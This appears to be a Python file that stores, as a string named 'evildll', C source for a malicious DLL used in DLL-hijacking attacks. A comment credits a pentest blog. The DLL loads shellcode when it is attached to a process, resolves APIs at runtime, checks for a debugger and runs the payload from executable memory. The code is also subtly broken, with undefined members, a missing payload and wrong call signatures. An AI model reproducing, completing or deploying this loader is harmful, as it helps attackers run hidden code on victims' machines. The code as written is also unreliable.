# Most of this code comes from https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html
evildll = """#include <windows.h>
#include <string.h>
#include <stdio.h>

// Structure for storing API addresses
typedef struct _API_TABLE {
    FARPROC VirtualAllocEx;
    FARPROC WriteProcessMemory;
    FARPROC CreateThread;
    FARPROC VirtualProtectEx;
    FARPROC VirtualFreeEx;
    FARPROC GetProcAddress;
    FARPROC GetModuleHandleA;
    FARPROC GetCurrentProcess;
    FARPROC Sleep;
} API_TABLE;

// Global storage for API addresses
API_TABLE apiTable;

// Function to resolve API addresses dynamically
BOOL ResolveAPIAddresses() {
    // Get kernel32 handle
    HMODULE hKernel32 = apiTable.GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return FALSE;

    // Resolve required APIs
    apiTable.VirtualAllocEx = apiTable.GetProcAddress(hKernel32, "VirtualAllocEx");
    apiTable.WriteProcessMemory = apiTable.GetProcAddress(hKernel32, "WriteProcessMemory");
    apiTable.CreateThread = apiTable.GetProcAddress(hKernel32, "CreateThread");
    apiTable.VirtualProtectEx = apiTable.GetProcAddress(hKernel32, "VirtualProtectEx");
    apiTable.VirtualFreeEx = apiTable.GetProcAddress(hKernel32, "VirtualFreeEx");
    
    return TRUE;
}

// Function to check if we're being debugged
BOOL IsBeingDebugged() {
    return apiTable.IsDebuggerPresent();
}

// Thread function for payload execution
DWORD WINAPI ExecutePayload(LPVOID lpParameter) {
    LPVOID memBuffer;
    HANDLE hProcess;
    SIZE_T bytesWritten;
    DWORD oldProtect;

    // Initialize API addresses
    apiTable.GetProcAddress = GetProcAddress;
    apiTable.GetModuleHandleA = GetModuleHandleA;
    apiTable.GetCurrentProcess = GetCurrentProcess;
    apiTable.Sleep = Sleep;

    if (!ResolveAPIAddresses()) {
        return -1;
    }

    // Anti-debugging checks
    if (IsBeingDebugged()) {
        apiTable.Sleep(hProcess, 5000); // Sleep if debugger detected
        return -2;
    }

    // Get current process handle
    hProcess = apiTable.GetCurrentProcess();
    if (!hProcess) {
        return -3;
    }

    // Allocate memory with initial read/write permissions
    memBuffer = apiTable.VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(payload),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!memBuffer) {
        return -4;
    }

    // Copy payload into allocated memory
    if (!apiTable.WriteProcessMemory(
        hProcess,
        memBuffer,
        payload,
        sizeof(payload),
        &bytesWritten
    )) {
        apiTable.VirtualFreeEx(hProcess, memBuffer, 0, MEM_RELEASE);
        return -5;
    }

    // Change memory protection to executable
    if (!apiTable.VirtualProtectEx(
        hProcess,
        memBuffer,
        sizeof(payload),
        PAGE_EXECUTE_READ,
        &oldProtect
    )) {
        apiTable.VirtualFreeEx(hProcess, memBuffer, 0, MEM_RELEASE);
        return -6;
    }

    // Execute payload
    ((void(*)())memBuffer)();

    // Cleanup
    apiTable.VirtualFreeEx(hProcess, memBuffer, 0, MEM_RELEASE);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    HANDLE hThread;
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Start suspended thread
            hThread = apiTable.CreateThread(
                NULL,
                0,
                ExecutePayload,
                NULL,
                CREATE_SUSPENDED,
                NULL
            );
            
            if (hThread) {
                // Random delay before resuming
                DWORD delay = rand() % 2000 + 1000;
                apiTable.Sleep(delay);
                
                // Resume thread
                apiTable.ResumeThread(hThread, 0);
                apiTable.CloseHandle(hThread);
            }
            break;

        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
"""
